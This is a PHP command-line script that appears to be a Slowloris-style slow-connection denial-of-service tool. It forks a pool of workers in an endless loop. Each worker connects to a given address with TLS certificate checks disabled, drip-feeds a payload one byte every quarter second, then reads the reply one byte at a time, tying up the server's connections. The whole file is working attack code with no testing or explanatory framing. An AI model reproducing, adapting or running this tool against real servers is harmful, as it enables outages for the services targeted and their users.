<?php

if (count($argv) < 4) {
    fwrite(STDERR, 'Usage: [threads] [address] [payload]');
    exit;
}

const DELAY_US = 250000;

$THREADS = (int) $argv[1];
$ADDRESS = $argv[2];
$PAYLOAD = file_get_contents($argv[3]);

if (getenv('DEBUG')) {
    $THREADS = 1;
}

$pool = [];

while (true) {
    if (count($pool) < $THREADS) {
        switch ($pid = pcntl_fork()) {
            case -1:
                die('Fork failed');
            case  0:
                worker();
                return;
            default:
                fwrite(STDOUT, "Forked child: " . $pid . PHP_EOL);
                $pool[$pid] = true;
                usleep(DELAY_US);
                break;
        }
        continue;
    }

    fwrite(STDERR, 'Pool full' . PHP_EOL);

    $pid = pcntl_wait($status);
    if (isset($pool[$pid])) {
        fwrite(STDOUT, "Child " . $pid . " exited" . PHP_EOL);
        unset($pool[$pid]);
    }
}

function worker()
{
    global $ADDRESS, $PAYLOAD;

    $client = stream_socket_client($ADDRESS, $errnum, $errmsg, 30.0, STREAM_CLIENT_CONNECT, stream_context_create([
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ]
    ]));

    if (false === $client) {
        fwrite(STDERR, 'Unable to create socket client:' . PHP_EOL);
        return;
    }

    stream_set_read_buffer($client, 1);

    if ($errnum) {
        fwrite(STDERR, $errmsg . PHP_EOL);
        return;
    }

    $pos = 0; while($pos < strlen($PAYLOAD)) {
        if (getenv('DEBUG')) {
            fwrite(STDOUT, $PAYLOAD[$pos]);
        }
        $pos += fwrite($client, $PAYLOAD[$pos]);
        usleep(DELAY_US);
    }

    while (! feof($client)) {
        if (getenv('DEBUG')) {
            fwrite(STDOUT, fread($client, 1));
        }
        usleep(DELAY_US);
    }
}
